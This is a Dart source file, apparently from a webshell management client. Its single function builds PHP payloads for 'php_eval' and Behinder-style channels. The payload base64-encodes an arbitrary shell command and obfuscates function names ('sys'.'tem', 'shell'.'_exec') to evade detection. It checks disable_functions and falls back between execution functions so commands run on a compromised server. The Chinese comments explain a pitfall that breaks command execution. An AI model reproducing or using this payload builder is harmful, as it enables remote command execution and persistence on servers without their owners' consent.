import 'dart:convert';

/// 构造 `php_eval` / `php_behinder` 共用的命令执行 PHP 代码。
///
/// [command] 是完整的 shell 命令（调用方可以自行加 `cd … && ` 前缀）。
/// 返回值直接交给目标的 `eval` 或 Behinder 通道执行。
///
/// 关键点：`$y='sys'.'tem';` 必须在 `if/else` 之前完成赋值。`else` 前面
/// 不能出现其他语句，否则 PHP 会报 `unexpected 'else'`，表现为 ping 正常、
/// 命令执行 HTTP 500。
String buildPhpCommandPayload(String command) {
  final b64 = base64.encode(utf8.encode(command));
  return "\$f='base'.'64_decode';\$c=\$f('$b64');"
      r"$d='preg'.'_split';"
      r"$df=$d('/[\s,]+/',(string)@ini_get('disable_functions'),-1,PREG_SPLIT_NO_EMPTY);"
      r"$s='shell'.'_exec';"
      r"$y='sys'.'tem';"
      r"if(function_exists($s)&&!in_array($s,$df,true)){echo (string)@$s($c.' 2>&1');}"
      r"else{@$y($c.' 2>&1');}";
}
